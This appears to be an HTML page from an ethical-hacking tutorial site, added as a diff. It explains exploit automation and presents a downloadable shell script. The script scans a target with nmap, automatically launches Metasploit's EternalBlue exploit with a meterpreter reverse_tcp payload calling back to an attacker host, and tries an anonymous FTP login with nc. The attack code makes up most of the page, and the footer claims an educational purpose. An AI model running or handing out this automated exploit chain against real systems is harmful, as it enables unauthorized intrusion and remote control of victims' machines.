@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <title>PEN-TEST | ADRIAN</title>
+  <link rel="stylesheet" href="../style.css" type="text/css" media="all" />
+</head>
+<body>
+
+  <div class="main-header">
+    <h1>CyberSHESH</h1>
+  </div>
+
+  <div class="main-home">
+    <h1>ETHICAL HACKING | PENETRATION TESTING</h1>
+    <hr />
+    <p>By: Adrian Martin</p>
+  </div>
+
+  <br />
+
+  <div class="main-NDM">
+    <h1>Exploit Automation</h1>
+    <button class="back-btn"><a href="../CSh.html">BACK</a></button>
+  </div>
+
+  <div class="discription-NDM">
+    <h2>What is Exploit Automation?</h2>
+    <h2>Exploit Automation is the process of automatically identifying vulnerabilities on a target system and launching known exploits against them without manual input. It helps ethical hackers and penetration testers save time and perform consistent exploitation procedures.</h2>
+    <br />
+    <h2>Why is Exploit Automation Important in Ethical Hacking and Penetration Testing?</h2>
+    <h2>Exploit automation is useful because it:</h2>
+
+    <ul class="full-list">
+      <li>Speeds up the penetration testing process</li>
+      <li>Reduces manual errors during exploitation</li>
+      <li>Helps demonstrate real-world attack impact to clients</li>
+      <li>Can chain scanning, analysis, and exploitation into one workflow</li>
+    </ul>
+
+    <h2>It’s a powerful tool, but must be used ethically and legally, with permission from the system owner.</h2>
+    <h2>Shell Script: Exploit Automation Example</h2>
+    <div class="box-code">
+<pre><code>
+#!/bin/sh
+
+#CHANGE IP TO YOUR TARGET
+TARGET="192.168.1.1"
+OUTPUT="/storage/emulated/0/Download/scan_result.txt"
+
+echo "[+] Scanning $TARGET for open ports and vulnerable services..."
+nmap -sV --script vuln -oN $OUTPUT $TARGET
+
+echo "[+] Parsing result for known vulnerabilities..."
+
+# Check if EternalBlue (MS17-010) is present
+if grep -q "smb-vuln-ms17-010" "$OUTPUT"; then
+    echo "[!] MS17-010 (EternalBlue) detected! Launching exploit..."
+    
+    cat > exploit.rc << EOF
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS $TARGET
+set LHOST 192.168.1.1 #CHANGE THIS TO YOUR IP
+set LPORT 4444
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+exploit
+EOF
+
+    msfconsole -r exploit.rc
+    exit
+fi
+
+# Check for Anonymous FTP login
+if grep -q "21/tcp.*ftp" "$OUTPUT"; then
+    echo "[!] FTP service found. Trying anonymous login exploit..."
+    echo -e "USER anonymous\r\nPASS anonymous\r\nQUIT\r\n" | nc $TARGET 21
+fi
+
+echo "[+] Automation complete. Output saved to your Downloads folder."
+</code></pre>
+    </div>
+    <button class="downloadBTN"><a href="../SCRIPT/EA.sh">DOWNLOAD CODE</a></button>
+  </div>
+
+  <footer style="background-color: #111; padding: 20px; text-align: center; color: #fff; border-top: 2px solid red;">
+    <h2 style="color: red; margin-bottom: 10px;">For Educational Purpose Only!</h2>
+    <p>This website is built strictly for cybersecurity awareness and ethical hacking education.</p>
+    <p style="color: orange; font-weight: bold;">This page contains security features. Activities are being monitored.</p>
+    <p>Use at your own risk. Unauthorized testing on live systems is illegal.</p>
+    <p><a href="../privacy/privacy.html" style="color: red; text-decoration: underline;">Privacy & Legal Rights</a></p>
+    <br />
+    <p style="color: gray;">© 2025 CyberSHESH | Developed by Adrian Martin</p>
+  </footer>
+
+  <script src="../js/main.js"></script>
+  <script src="../js/pycode.js"></script>
+</body>
+</html>
